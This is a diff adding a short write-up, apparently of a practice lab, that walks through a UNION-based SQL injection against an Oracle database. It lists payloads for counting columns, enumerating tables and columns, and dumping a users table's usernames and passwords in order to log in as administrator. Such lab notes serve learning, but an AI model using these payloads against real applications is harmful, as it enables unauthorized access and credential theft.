@@ -1,0 +1,33 @@
+Perform a Union attack on an Oracle DB
+
+Objective:
+- Determine which table contain username and password
+- Determine the columns name of the table
+- Output the content of the table
+- Login as administrator
+
+Analysis:
+
+STEP1: Determine the number of columns
+
+Payload: ' order by 1 --
+Output: There is 2 columns in the table
+
+STEP2: Determining the type of data in the columns
+
+Payload: ' Union SELECT 'a', NULL FROM dual --
+Output: The 2 columns can contain string data
+
+STEP3: Determine which table contain username and password
+
+Payload: ' UNION SELECT table_name, NULL FROM all_tables --
+
+STEP4: Determining the columns name of the table
+
+Payload: 'UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_MZTMQJ'--
+output: PASSWORD_DHZUED ; USERNAME_CDSEVW
+
+STEP5 : Output the contents of the columns
+
+Payload: ' UNION SELECT USERNAME_CDSEVW, PASSWORD_DHZUED FROM USERS_MZTMQJ--
+
